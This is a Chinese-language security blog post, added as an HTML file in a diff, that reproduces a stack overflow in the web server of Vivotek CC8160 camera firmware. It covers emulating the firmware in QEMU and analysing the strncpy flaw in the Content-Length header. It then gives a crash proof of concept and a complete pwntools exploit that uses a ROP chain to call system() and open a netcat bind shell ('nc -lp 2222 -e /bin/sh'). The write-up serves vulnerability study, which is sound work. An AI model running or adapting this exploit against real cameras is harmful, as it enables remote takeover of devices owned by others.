@@ -1,0 +1,590 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>vivotek 摄像头栈溢出漏洞复现 | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="固件影响版本：太多了，以CC8160 为例 固件下载地址：https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip 环境修复固件解包不多说，查看一下漏洞文件 123456789$ file ./usr/sbin/httpd./usr/sbin/httpd: ELF 32-bit LSB executable, ARM">
+<meta name="keywords" content="iot,栈溢出,摄像头">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vivotek 摄像头栈溢出漏洞复现">
+<meta property="og:url" content="p1Kk.github.io/2021/04/14/iot/vivotek 摄像头栈溢出漏洞复现/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="固件影响版本：太多了，以CC8160 为例 固件下载地址：https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip 环境修复固件解包不多说，查看一下漏洞文件 123456789$ file ./usr/sbin/httpd./usr/sbin/httpd: ELF 32-bit LSB executable, ARM">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFstrncpy.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFshell.png">
+<meta property="og:updated_time" content="2021-04-17T01:24:11.463Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vivotek 摄像头栈溢出漏洞复现">
+<meta name="twitter:description" content="固件影响版本：太多了，以CC8160 为例 固件下载地址：https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip 环境修复固件解包不多说，查看一下漏洞文件 123456789$ file ./usr/sbin/httpd./usr/sbin/httpd: ELF 32-bit LSB executable, ARM">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFstrncpy.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2021/04/14/iot/vivotek 摄像头栈溢出漏洞复现/" title="vivotek 摄像头栈溢出漏洞复现" itemprop="url">vivotek 摄像头栈溢出漏洞复现</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2021-04-13T16:00:00.000Z" itemprop="datePublished"> Published 2021-04-14</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境修复"><span class="toc-number">1.</span> <span class="toc-text">环境修复</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#user-mod"><span class="toc-number">1.1.</span> <span class="toc-text">user-mod</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-mod"><span class="toc-number">1.2.</span> <span class="toc-text">sys-mod</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">2.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+		  
+		  </div>
+		  
+		  <p>固件影响版本：太多了，以CC8160 为例</p>
+<p>固件下载地址：<a href="https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip" target="_blank" rel="noopener">https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip</a></p>
+<h1 id="环境修复"><a href="#环境修复" class="headerlink" title="环境修复"></a>环境修复</h1><p>固件解包不多说，查看一下漏洞文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./usr/sbin/httpd</span></span><br><span class="line">./usr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec ./usr/sbin/httpd</span></span><br><span class="line">[*]</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user-mod"></a>user-mod</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-arm-static ) ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">[14/Apr/2021:13:50:39 +0000] src/boa.c:284 (main) - can't open /dev/null: No such file or directory</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解决：</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch ./dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">Could not open boa.conf for reading.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 有这个文件吗？在主目录下也没有找到这个boa.conf文件。进入ida查看，其实是要打开/etc/conf.d/boa/boa.conf，但是</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ll ./etc/conf.d</span></span><br><span class="line">lrwxrwxrwx 1 kk kk 23 Dec  6  2016 ./etc/conf.d -&gt; ../mnt/flash/etc/conf.d</span><br><span class="line"><span class="meta">#</span><span class="bash"> 但是并没有这个../mnt等文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最终在_31...目录下找到了boa.conf，在./defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d/boa/boa.conf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一下文件夹再粘贴，我还把相对路径给理解错了，这里mnt和etc是同一级的</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp -r ../../defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d ./mnt/flash/etc/conf.d</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">gethostbyname:: Success</span><br><span class="line"><span class="meta">#</span><span class="bash"> 看见success，其实没跑起来，ida查看引用，是利用了gethostbyname()函数，返回rlimits结构体中通过主机名找到的ip地址</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat ./etc/hosts</span></span><br><span class="line">127.0.0.1 Network-Camera localhost</span><br><span class="line"><span class="meta">$</span><span class="bash"> hostname</span></span><br><span class="line">ubuntu</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改为</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat ./etc/hosts </span></span><br><span class="line">127.0.0.1 ubuntu localhost</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 再次运行，虽然有错误（AM_ParseConfigFile函数，不是很清楚），但是已经成功运行起来了</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[0] is /video3.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[1] is /video4.mjpg</span><br><span class="line">AM_ParseConfigFile failed</span><br><span class="line">[15/Apr/2021:01:01:02 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)</span><br><span class="line">[15/Apr/2021:01:01:02 +0000] boa: starting server pid=3511, port 80</span><br><span class="line"><span class="meta">$</span><span class="bash"> ps aux | grep httpd</span></span><br><span class="line">root       3511  0.8  0.0 4240192 6216 pts/0    Sl   18:01   0:00 ./qemu-arm-static ./usr/sbin/httpd</span><br><span class="line">kk         3514  0.0  0.0  14436  1068 pts/0    S+   18:01   0:00 grep --color=auto httpd</span><br></pre></td></tr></table></figure>
+
+<h2 id="sys-mod"><a href="#sys-mod" class="headerlink" title="sys-mod"></a>sys-mod</h2><ol>
+<li>额…我的磁盘有点儿问题</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo guestmount -a debian_wheezy_armel_standard.qcow2 -m /dev/sda2 /mnt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp -rf ./squashfs-root /mnt/root/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo guestunmount /mnt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo tunctl -t tap0 -u `whoami`</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ifconfig tap0 192.168.65.1/24</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"></span><br><span class="line">root@debian-armel:~# ifconfig eth0 192.168.65.2/24</span><br><span class="line">root@debian-armel:~# mount -t proc /proc ./squashfs-root/proc		# 默认/dev和/proc在chroot的时候是不会挂载的，需要手动挂载。</span><br><span class="line">root@debian-armel:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armel:~# chroot ./squashfs-root /bin/sh</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>用这个<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo tunctl -t tap0 -u `whoami`</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ifconfig tap0 192.168.65.1/24</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/sda1"</span>  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"></span><br><span class="line">; 进入后使用ftp进行文件传输</span><br><span class="line">root@debian-armel:~# ifconfig eth0 192.168.65.2/24</span><br><span class="line">; 传输完成后</span><br><span class="line">root@debian-armel:~# mount -t proc /proc ./squashfs-root/proc		; 默认/dev和/proc在chroot的时候是不会挂载的，需要手动挂载。</span><br><span class="line">root@debian-armel:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armel:~# chroot ./squashfs-root /bin/sh</span><br><span class="line">/ # ls</span><br><span class="line">bin              home             qemu-arm-static  tmpfs</span><br><span class="line">dev              lib              root             usr</span><br><span class="line">drivers          linuxrc          sbin             var</span><br><span class="line">etc              mnt              sys              www</span><br><span class="line">gdbserver        proc             tmp</span><br><span class="line">; 同上面usermod，修改一下hostname就可以跑起来了</span><br><span class="line">/ # ./usr/sbin/httpd</span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[0] is /video3.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[1] is /video4.mjpg</span><br><span class="line">AM_ParseConfigFile failed</span><br><span class="line">[15/Apr/2021:05:49:21 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)</span><br><span class="line">[15/Apr/2021:05:49:21 +0000] boa: starting server pid=2400, port 80</span><br><span class="line">/ # ps T | grep httpd</span><br><span class="line"> 2400 root      1336 S    ./usr/sbin/httpd</span><br><span class="line"> 2406 root      1368 S    grep httpd</span><br><span class="line">/ # ./gdbserver --attach 192.168.65.2:1234 $(ps|grep upnpd|grep -v grep|awk '&#123;print $1&#125;')		;远程调试</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞位于<code>/usr/sbin/httpd</code>中的<code>sub_17F80</code>，是由于Content-Length引起的溢出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFstrncpy.png" alt></p>
+<blockquote>
+<ul>
+<li><p>strncpy()用来复制字符串的前n个字符，其原型为：<br><code>char * strncpy(char *dest, const char *src, size_t n);</code></p>
+<p>【参数说明】dest 为目标字符串指针，src 为源字符串指针。</p>
+<p>strncpy()会将字符串src前n个字符拷贝到字符串dest。</p>
+<p>不像strcpy()，<strong>strncpy()不会向dest追加结束标记’\0’</strong>，这就引发了很多不合常理的问题，将在下面的示例中说明。</p>
+<p>注意：src 和 dest 所指的内存区域不能重叠，且 dest 必须有足够的空间放置n个字符。</p>
+<p>【返回值】返回字符串dest。</p>
+</li>
+<li><p>strchr() 用来查找某字符在字符串中首次出现的位置，其原型为：<br><code>char * strchr (const char *str, int c);</code></p>
+<p>【参数】str 为要查找的字符串，c 为要查找的字符。</p>
+<p>strchr() 将会找出 <strong>str 字符串中第一次出现的字符 c 的地址</strong>，然后将该地址返回。</p>
+<p>注意：字符串 str 的结束标志 NUL 也会被纳入检索范围，所以 str 的组后一个字符也可以被定位。</p>
+<p>【返回值】如果找到指定的字符则返回该字符所在地址，否则返回 NULL。</p>
+<p>返回的地址是字符串在内存中随机分配的地址再加上你所搜索的字符在字符串位置。设字符在字符串中首次出现的位置为 i，那么返回的地址可以理解为 str + i。</p>
+</li>
+</ul>
+<p><a href="https://www.huaweicloud.com/articles/11adf8c5e55a63fec81650988a8eeedb.html" target="_blank" rel="noopener">GET POST PUT DELETE的区别</a></p>
+</blockquote>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">	&quot;Content-Length&quot;:&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.65.2&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure>
+
+<p>可以测出偏移是0x33（额我和网上别人的偏移不一样呢）</p>
+<p>栈溢出就利用ROP来做，关于arm以前也做过。所以就考虑将参数放入R0，目标函数system放到PC中</p>
+<blockquote>
+<ol>
+<li><p>参数传递</p>
+<p>前4个参数通过R0 ~ R3传递，第4个参数需要通过sp访问，第5个参数需要sp+4访问，第n个参数需要通过sp + 4*(n-4)访问；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反，子程序返回前无需恢复R0~R3的值</p>
+</li>
+<li><p>在子程序中，使用R4~R11保存局部变量，若使用需要入栈保存，子程序返回前需要恢复这些寄存器；R12是临时寄存器，使用不需要保存</p>
+</li>
+<li><p>子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位</p>
+</li>
+</ol>
+</blockquote>
+<p>使用ROPgadget查找可用的ROP链，在httpd中地址都含有00，对于strncpy会截断无法使用，在libc中加上基址以后就好很多。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./lib/libuClibc-0.9.33.3-git.so --only &quot;pop|mov&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">...</span><br><span class="line">0x00033100 : pop &#123;r0, pc&#125;		# 这条是最简单的，但是由于地址存在00，会被截断，所以考虑先传入其他寄存器，再由其他寄存器传递给R0</span><br><span class="line">0x00048784 : pop &#123;r1, pc&#125;		# 先传递给R1，顺便将第二条gadget传给pc</span><br><span class="line">0x00016aa4 : mov r0, r1 ; pop &#123;r4, r5, pc&#125;			# 第二条gadget，将R1传递给R0，再将栈中的内容依次传递给r4\r5\pc</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>虽然说这种设备一般都不会开启ASLR，但是这个debian默认开启的，对我们调试程序很不友好，先关掉</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ # echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>所以查看libc基址可以使用gdb中的<code>vmmap</code>或在debian虚拟机中使用<code>cat /proc/xxxx[进程号]/maps</code>查看</p>
+<p>综上，构造payload为<code>&quot;a&quot;*offset+p32(rop1)+p32(r0-&gt;cmd_addr)+p32(rop2)+p32(r4_content)+p32(r5_content)+p32(sys_addr)+cmd</code></p>
+<p>这个cmd字符串可以先随便写，然后到栈中查找这个字符串就可以得到地址（实际地址需要将查到的地址再-1）</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">libc_base = 0xb6f2d000</span><br><span class="line">libc = ELF(&quot;./lib/libuClibc-0.9.33.3-git.so&quot;)</span><br><span class="line">sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">rop1 = libc_base + 0x00048784 				# pop &#123;r1, pc&#125;</span><br><span class="line">rop2 = libc_base + 0x00016aa4 				# mov r0, r1 ; pop &#123;r4, r5, pc&#125;</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line">success(&quot;rop1 = &quot;+hex(rop1))</span><br><span class="line">success(&quot;rop2 = &quot;+hex(rop2))</span><br><span class="line">cmd = &quot;nc -lp 2222 -e /bin/sh;&quot;</span><br><span class="line">cmd_addr = 0xbeffeb64</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">	&quot;Content-Length&quot;:&quot;a&quot;*0x33 + p32(rop1) + p32(cmd_addr) + p32(rop2) + &quot;a&quot;*4 + &quot;b&quot;*4 + p32(sys_addr) + cmd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.65.2&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFshell.png" alt></p>
+<blockquote>
+<p>Reference:</p>
+<p><a href="https://xz.aliyun.com/t/5054#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054#toc-0</a></p>
+</blockquote>
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/漏洞复现/">漏洞复现</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/iot/">iot</a><a href="/tags/栈溢出/">栈溢出</a><a href="/tags/摄像头/">摄像头</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2021/06/11/iot/施耐德 NOE771/" title="施耐德 NOE771 后门分析（ida函数恢复）">
+  <span>
+  施耐德 NOE771 后门分析（ida函数恢复）</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2021/04/04/others/符号执行&污点分析/"  title="符号执行&amp;污点分析简述">
+ <span>符号执行&amp;污点分析简述
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>20</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/漏洞复现/" title="漏洞复现">漏洞复现<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>23</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>38</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>24</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tw/" title="tw">tw<sup>16</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/iot/" title="iot">iot<sup>15</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/路由器/" title="路由器">路由器<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈溢出/" title="栈溢出">栈溢出<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cve/" title="cve">cve<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/环境搭建/" title="环境搭建">环境搭建<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令注入/" title="命令注入">命令注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令执行/" title="命令执行">命令执行<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/认证绕过/" title="认证绕过">认证绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/摄像头/" title="摄像头">摄像头<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/待完善/" title="待完善">待完善<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2024 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
